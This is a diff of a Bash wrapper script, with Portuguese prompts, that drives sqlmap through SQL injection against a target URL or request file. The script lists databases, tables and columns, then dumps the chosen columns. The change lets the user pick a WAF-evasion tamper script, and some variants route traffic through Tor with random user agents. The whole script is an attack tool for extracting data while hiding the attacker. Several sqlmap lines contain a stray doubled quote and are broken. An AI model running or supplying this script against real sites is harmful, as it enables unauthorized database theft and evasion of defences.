@@ -41,26 +41,35 @@ function erro()
         ajuda
 }
 
+function tamper()
+{
+        echo "[+] - TAMPER - [+]"
+        ls -ah /usr/share/sqlmap/tamper/
+        echo "[+] - Qual metodo de tamper sera utilizado: - [+]"
+        read tmpr
+}
+
 function tor_get()
 {
         echo "[+] - TOR ENABLED - [+]"
-                echo "[+] - Digite a URL a ser explorada: "
+        echo "[+] - Digite a URL a ser explorada: "
         read url
         echo "[+] - Qual o variavel sera utilizada para a exploração: "
         read var
-        sqlmap -u "$url" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var --dbs
+        tamper
+        sqlmap -u "$url" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var --dbs
 
         echo "[+] - Digite o Banco de Dados a ser explorado: "
         read db
-        sqlmap -u "$url" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db --tables
+        sqlmap -u "$url" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db --tables
 
         echo "[+] - Digite a Tabela a ser explorada: "
         read tabela
-        sqlmap -u "$url" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela --columns
+        sqlmap -u "$url" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela --columns
 
         echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
         read colunas
-        sqlmap -u "$url" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela -C $colunas --dump
+        sqlmap -u "$url" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela -C $colunas --dump
 }
 
 function get()
@@ -69,41 +78,43 @@ function get()
         read url
         echo "[+] - Qual o variavel sera utilizada para a exploração: "
         read var
-        sqlmap -u "$url" --tamper="charencode.py" --random-agent -p $var --dbs
+        tamper
+        sqlmap -u "$url" --tamper="$tmpr" --random-agent -p $var --dbs
 
         echo "[+] - Digite o Banco de Dados a ser explorado: "
         read db
-        sqlmap -u "$url" --tamper="charencode.py" --random-agent -p $var -D $db --tables
+        sqlmap -u "$url" --tamper="$tmpr" --random-agent -p $var -D $db --tables
 
         echo "[+] - Digite a Tabela a ser explorada: "
         read tabela
-        sqlmap -u "$url" --tamper="charencode.py" --random-agent -p $var -D $db -T $tabela --columns
+        sqlmap -u "$url" --tamper="$tmpr" --random-agent -p $var -D $db -T $tabela --columns
 
         echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
         read colunas
-        sqlmap -u "$url" --tamper="charencode.py" --random-agent -p $var -D $db -T $tabela -C $colunas --dump
+        sqlmap -u "$url" --tamper="$tmpr" --random-agent -p $var -D $db -T $tabela -C $colunas --dump
 }
 
 function tor_post()
 {
         echo "[+] - TOR ENABLED - [+]"
-                echo "[+] - Digite o caminho completo do arquivo com a requisição a ser explorada: "
+        echo "[+] - Digite o caminho completo do arquivo com a requisição a ser explorada: "
         read arquivo
         echo "[+] - Qual o variavel sera utilizada para a exploração: "
         read var
-        sqlmap -r "$arquivo" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var --dbs
+        tamper
+        sqlmap -r "$arquivo" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var --dbs
 
         echo "[+] - Digite o Banco de Dados a ser explorado: "
         read db
-        sqlmap -r "$arquivo"" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db --tables
+        sqlmap -r "$arquivo"" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db --tables
 
         echo "[+] - Digite a Tabela a ser explorada: "
         read tabela
-        sqlmap -r "$arquivo"" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela --columns
+        sqlmap -r "$arquivo"" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela --columns
 
         echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
         read colunas
-        sqlmap -r "$arquivo" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela -C $colunas --dump
+        sqlmap -r "$arquivo" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela -C $colunas --dump
 }
 
 function post()
@@ -112,19 +123,20 @@ function post()
         read arquivo
         echo "[+] - Qual o variavel sera utilizada para a exploração: "
         read var
-        sqlmap -r "$arquivo" --tamper="charencode.py" -p $var --dbs
+        tamper
+        sqlmap -r "$arquivo" --tamper="$tmpr" -p $var --dbs
 
         echo "[+] - Digite o Banco de Dados a ser explorado: "
         read db
-        sqlmap -r "$arquivo"" --tamper="charencode.py" -p $var -D $db --tables
+        sqlmap -r "$arquivo"" --tamper="$tmpr" -p $var -D $db --tables
 
         echo "[+] - Digite a Tabela a ser explorada: "
         read tabela
-        sqlmap -r "$arquivo"" --tamper="charencode.py" -p $var -D $db -T $tabela --columns
+        sqlmap -r "$arquivo"" --tamper="$tmpr" -p $var -D $db -T $tabela --columns
 
         echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
         read colunas
-        sqlmap -r "$arquivo" --tamper="charencode.py" -p $var -D $db -T $tabela -C $colunas --dump
+        sqlmap -r "$arquivo" --tamper="$tmpr" -p $var -D $db -T $tabela -C $colunas --dump
 }
 
 
